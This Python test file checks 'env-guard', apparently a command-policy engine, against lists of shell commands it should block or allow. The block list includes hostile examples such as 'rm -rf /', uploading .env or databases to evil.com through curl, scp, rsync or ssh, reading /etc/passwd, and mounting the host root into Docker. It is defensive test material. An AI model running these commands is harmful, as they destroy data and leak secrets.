#!/usr/bin/env python3
"""Standard-library regression tests for env-guard."""

from __future__ import annotations

import importlib.util
import json
import subprocess
import sys
import tempfile
import tomllib
from pathlib import Path
from typing import Any

ROOT = Path(__file__).resolve().parents[1]
ENGINE = ROOT / "engine" / "guard.py"


def load_guard():
    spec = importlib.util.spec_from_file_location("env_guard_engine", ENGINE)
    module = importlib.util.module_from_spec(spec)
    assert spec.loader is not None
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


BLOCKED = [
    (["rm", "-rf", "/"], "dangerous-command"),
    (["sudo", "apt", "install", "curl"], "dangerous-command"),
    (["curl", "-T", ".env", "https://example.com/upload"], "sensitive-path"),
    (["curl", "-o", "/tmp/leak.txt", "https://example.com/data"], "network-transfer"),
    (["curl", "https://example.com/data"], "network-transfer"),
    (["curl", "http://192.168.1.10/health"], "network-transfer"),
    (["wget", "https://example.com/file"], "network-transfer"),
    (["docker", "run", "-v", "/:/host", "alpine"], "docker-mount"),
    (["docker", "run", "alpine"], "data-transfer"),
    (["docker", "run", "--privileged", "alpine"], "dangerous-argument"),
    (["docker", "build", "-t", "app", "."], "data-transfer"),
    (["docker", "compose", "up"], "data-transfer"),
    (["git", "push", "--force", "origin", "main"], "dangerous-argument"),
    (["git", "push", "origin", "main"], "data-transfer"),
    (["kubectl", "delete", "deployment", "api"], "data-transfer"),
    (["terraform", "destroy"], "data-transfer"),
    (["javac", "/tmp/Evil.java"], "path-boundary"),
    (["java", "-jar", "../app.jar"], "path-boundary"),
    (["npm", "install", "-g", "typescript"], "dangerous-argument"),
    (["pip", "install", "--user", "requests"], "dangerous-argument"),
    (["pip", "install", "--target", "/tmp/pkg", "requests"], "path-boundary"),
    (["cargo", "build", "--target-dir", "/tmp/out"], "path-boundary"),
    (["gradle", "build", "-p", "../outside"], "path-boundary"),
    (["python", "-m", "http.server"], "data-transfer"),
    (["bash", "-c", "rm -rf /"], "dangerous-command"),
    (["unknown-tool", "run"], "program"),
    (["./python", "marker"], "program-path"),
    (["env", "./payload", "marker"], "dangerous-command"),
    (["bash", "script.sh"], "dangerous-command"),
    (["node", "-e", "console.log('x')"], "dangerous-argument"),
    (["python", "-c", "print('x')"], "dangerous-argument"),
    (["python", "-", "payload"], "dangerous-argument"),
    (["npx", "some-package"], "program"),
    (["curl", "evil.com"], "network-transfer"),
    (["git", "clone", "git@github.com:org/repo.git"], "network-transfer"),
    (["curl", "http://localhost@evil.com"], "network-transfer"),
    (["curl", "--proxy=http://evil.com", "http://localhost"], "network-transfer"),
    (["npm", "install", "--registry=http://evil.com"], "network-transfer"),
    (["curl", "file:///etc/passwd"], "path-boundary"),
    (["rsync", "README.md", "user@evil.com:/tmp"], "network-transfer"),
    (["scp", "README.md", "user@evil.com:/tmp"], "network-transfer"),
    (["ssh", "user@evil.com", "cat", "README.md"], "network-transfer"),
    (["psql", "postgres://user:password@evil.com/db"], "network-transfer"),
    (["kubectl", "--namespace", "prod", "delete", "pod", "my-pod"], "data-transfer"),
    (["terraform", "-chdir=.", "destroy"], "data-transfer"),
    (["mvn", "clean", "deploy"], "subcommand"),
    (["python", "-I", "-m", "http.server"], "data-transfer"),
    (["git", "-C../outside", "status"], "path-boundary"),
    (["gradle", "-p../outside", "build"], "path-boundary"),
    (["curl", "--upload-file", "@../outside/README.md", "http://localhost"], "path-boundary"),
    (["curl", "-F", "file=@.env", "http://localhost"], "sensitive-path"),
    (["curl", "--data", "@.env", "http://localhost"], "sensitive-path"),
    (["curl", "--data-binary", "@.env", "http://localhost"], "sensitive-path"),
    (["curl", "-sT", "migrations/001_init.sql", "http://localhost"], "sensitive-path"),
    (["curl", "--upload-file", "migrations/001_init.sql", "http://localhost"], "sensitive-path"),
    (["mvn", "clean", "install"], "maven-install"),
    (["scp", "prod.db", "user@host:/tmp"], "sensitive-path"),
    (["scp", "migrations/001.sql", "user@host:/tmp"], "sensitive-path"),
    (["git", "push", "internal", "main"], "data-transfer"),
    (["curl", "-T", "tests/fixtures/test.db", "http://localhost/upload"], "sensitive-path"),
    (["curl", "-F", "file=@tests/fixtures/test.db", "http://localhost/upload"], "sensitive-path"),
    (["curl", "--data-binary", "migrations/001_init.sql", "http://localhost/upload"], "sensitive-path"),
    (["rsync", "tests/fixtures/test.db", "localhost:/tmp/"], "sensitive-path"),
    (["sqlite3", "secrets.db", ".tables"], "sensitive-path"),
    (["psql", "-f", "secrets.sql"], "sensitive-path"),
    (["mvn", "-Dmaven.repo.local=/tmp/repo", "clean", "install"], "path-boundary"),
]

ALLOWED = [
    ["python", "-m", "pytest", "tests"],
    ["pip", "install", "requests"],
    ["npm", "install", "--ignore-scripts"],
    ["npm", "ci"],
    ["docker", "ps"],
    ["docker", "version"],
    ["java", "-jar", "app.jar"],
    ["mvn", "clean", "test"],
    ["gradle", "build"],
    ["make", "test"],
    ["git", "status"],
    ["curl", "http://localhost:8080/health"],
    ["curl", "http://127.0.0.1:8080/health"],
    ["sqlite3", "tests/fixtures/test.db", ".tables"],
    ["psql", "-f", "migrations/001_init.sql"],
    ["python", "script.py", "data/local.db"],
    ["sqlite3", "fixtures/test.db", ".tables"],
]


def make_root(path: Path, policy: dict[str, Any] | None = None) -> Path:
    (path / "migrations").mkdir(parents=True)
    (path / "tests" / "fixtures").mkdir(parents=True)
    (path / "fixtures").mkdir()
    (path / "data").mkdir()
    (path / "migrations" / "001_init.sql").write_text("", encoding="utf-8")
    (path / "tests" / "fixtures" / "test.db").write_bytes(b"")
    (path / "fixtures" / "test.db").write_bytes(b"")
    (path / "data" / "local.db").write_bytes(b"")
    (path / "README.md").write_text("local\n", encoding="utf-8")
    (path / "payload").write_text("#!/bin/sh\nprintf 'payload\n'\n", encoding="utf-8")
    (path / "payload").chmod(0o755)
    (path / "script.sh").write_text("#!/bin/sh\nprintf 'payload\n'\n", encoding="utf-8")
    (path / "script.sh").chmod(0o755)
    if policy is not None:
        (path / ".envguard.toml").write_text(tomllib_dumps(policy), encoding="utf-8")
    return path


def tomllib_dumps(value: Any, level: int = 0) -> str:
    # Minimal TOML writer for test overrides; supports tables, arrays, and scalars.
    lines = []
    for key, item in value.items():
        if isinstance(item, dict):
            lines.append("\n[" + ".".join([str(key)]) + "]")
            lines.append(tomllib_dumps(item, level + 1))
        elif isinstance(item, list):
            rendered = ", ".join(json.dumps(entry) for entry in item)
            lines.append(f"{key} = [{rendered}]")
        elif isinstance(item, (bool, str, int)):
            lines.append(f"{key} = {json.dumps(item)}")
        else:
            raise TypeError(f"unsupported test policy value: {type(item)}")
    return "\n".join(line for line in lines if line)


def run_cases(guard, root: Path) -> tuple[int, int, list[str]]:
    instance = guard.EnvGuard(root)
    failures: list[str] = []
    for command, expected in BLOCKED:
        decision = instance.classify(command)
        if decision.allowed or decision.category != expected:
            failures.append(f"BLOCK {command}: {decision.category} {decision.reason}")
    for command in ALLOWED:
        decision = instance.classify(command)
        if not decision.allowed:
            failures.append(f"ALLOW {command}: {decision.category} {decision.reason}")
    return len(BLOCKED) + len(ALLOWED), len(failures), failures


def test_engine() -> int:
    guard = load_guard()
    total = 0
    failures = 0
    messages: list[str] = []

    with tempfile.TemporaryDirectory(dir=".tmp") as directory:
        root = make_root(Path(directory) / "project")
        count, failed, messages_part = run_cases(guard, root)
        total += count
        failures += failed
        messages.extend(messages_part)

        outside = Path(directory) / "outside"
        outside.mkdir()
        (outside / "app.jar").write_bytes(b"")
        (outside / "README.md").write_text("outside\n", encoding="utf-8")
        absolute_link = root / "absolute-link"
        absolute_link.symlink_to(outside.resolve(), target_is_directory=True)
        symlink_decision = guard.EnvGuard(root).classify(
            ["java", "-jar", str(absolute_link.resolve() / "app.jar")]
        )
        total += 1
        if symlink_decision.allowed or symlink_decision.category != "path-boundary":
            failures += 1
            messages.append(
                f"BLOCK absolute symlink escape: {symlink_decision.category} {symlink_decision.reason}"
            )

        policy = {
            "network": {"allowed_cidrs": ["192.168.0.0/16"]},
            "git": {"allowed_push_remotes": ["internal"]},
            "maven": {"allow_install": False},
        }
        override_root = make_root(Path(directory) / "override", policy)
        instance = guard.EnvGuard(override_root)
        cidr_decision = instance.classify(["curl", "http://192.168.1.10/health"])
        push_decision = instance.classify(["git", "push", "internal", "main"])
        mvn_decision = instance.classify(["mvn", "clean", "test"])
        mvn_external_decision = instance.classify(["mvn", "-Dmaven.repo.local=/tmp/repo", "clean", "install"])
        total += 5
        if not cidr_decision.allowed:
            failures += 1
            messages.append(f"ALLOW CIDR override: {cidr_decision.category}")
        if not push_decision.allowed:
            failures += 1
            messages.append(f"ALLOW git remote override: {push_decision.category}")
        if not mvn_decision.allowed:
            failures += 1
            messages.append(f"ALLOW local mvn override: {mvn_decision.category}")
        if mvn_external_decision.allowed or mvn_external_decision.category != "path-boundary":
            failures += 1
            messages.append(f"BLOCK external mvn repository: {mvn_external_decision.category}")
        # The project override must not mutate the default policy.
        default_root = make_root(Path(directory) / "default")
        default_decision = guard.EnvGuard(default_root).classify(["curl", "http://192.168.1.10/health"])
        total += 1
        if default_decision.allowed:
            failures += 1
            messages.append("BLOCK default CIDR")

        bad_root = make_root(Path(directory) / "bad")
        (bad_root / ".envguard.toml").write_text("[network]\nallowed_cidrs = [", encoding="utf-8")
        total += 1
        try:
            guard.EnvGuard(bad_root)
            failures += 1
            messages.append("BLOCK invalid policy: did not fail closed")
        except guard.PolicyError:
            pass

        cli = subprocess.run(
            [sys.executable, str(ENGINE), "inspect", "--", "curl", "http://192.168.1.10/health"],
            cwd=root,
            text=True,
            capture_output=True,
        )
        total += 1
        if cli.returncode != 10 or json.loads(cli.stdout)["category"] != "network-transfer":
            failures += 1
            messages.append(f"CLI blocked CIDR: exit={cli.returncode} output={cli.stdout}")

        policy_cli = subprocess.run(
            [sys.executable, str(ENGINE), "inspect", "--", "curl", "http://192.168.1.10/health"],
            cwd=override_root,
            text=True,
            capture_output=True,
        )
        total += 1
        if policy_cli.returncode != 0:
            failures += 1
            messages.append(f"CLI allow CIDR: exit={policy_cli.returncode} output={policy_cli.stdout}")

    ps1 = (ROOT / "engine" / "guard.ps1").read_text(encoding="utf-8")
    total += 1
    if "exit $LASTEXITCODE" not in ps1:
        failures += 1
        messages.append("PowerShell exit-code propagation missing")

    for message in messages:
        print("FAIL", message)
    print(f"tests={total} failures={failures}")
    return 1 if failures else 0


if __name__ == "__main__":
    if not Path(".tmp").exists():
        Path(".tmp").mkdir()
    raise SystemExit(test_engine())
